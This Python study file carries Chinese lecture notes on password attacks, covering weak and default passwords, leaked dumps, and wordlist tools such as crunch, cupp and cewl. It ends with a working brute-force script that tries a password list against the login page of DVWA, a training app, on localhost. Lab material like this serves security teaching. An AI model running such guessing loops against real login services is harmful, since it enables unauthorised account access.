# -*- coding:utf-8 -*-
# ！/usr/bin/env python
# @Time : 2023/12/8 11:48
# @Author : waxberry
# @File : 密码破解.py
# @Software : PyCharm

'''
密码安全概述
    加密、完整性、身份认证
    存储安全、传输安全、输入安全

漏洞利用
    从数据库获取密码
    窃听通信数据
    直接从登录框猜测数据

权限管理
    认证：你是谁？
    授权：你能做什么？

不安全的密码
    默认密码
        000000
        123456
        空密码
        身份证后六位
        手机后六位

    弱口令
    裤子
        已经泄漏的密码

密码猜解思路
    猜测范围
    密码长度
    密码内容
    APP密码范围

字典
    kali字典存放路径
专门字典
【1】指定格式的字典，比如生日、手机号、QQ号 crunch -h
【2】社工字典
    cupp、ccupp
【3】文章内容字典
    cewl https://sqlmap.org -w dict.txt
'''


import requests
# 如果第一个密码就提示成功，是 PHPSESSID 没有替换的问题
pwds = open("password.txt")
for pwd in pwds:
    url = "http://localhost/dvwa/vulnerabilities/brute/"
    # PHPSESSID务必替换为登录以后的PHPSESSID
    resp = requests.get(url = url, params = {"username":"admin", "password":pwd.strip(), "Login":"Login"}, headers = {"Cookie":"security=low; PHPSESSID=sm7bdfe4r6c03ai9682timdlu1"})
    #print(resp.text)
    if 'Username and/or password incorrect.' in resp.text:
        print('破解失败：'+pwd, end='')
    else:
        print('破解成功：'+pwd, end='')
        break;
pwds.close()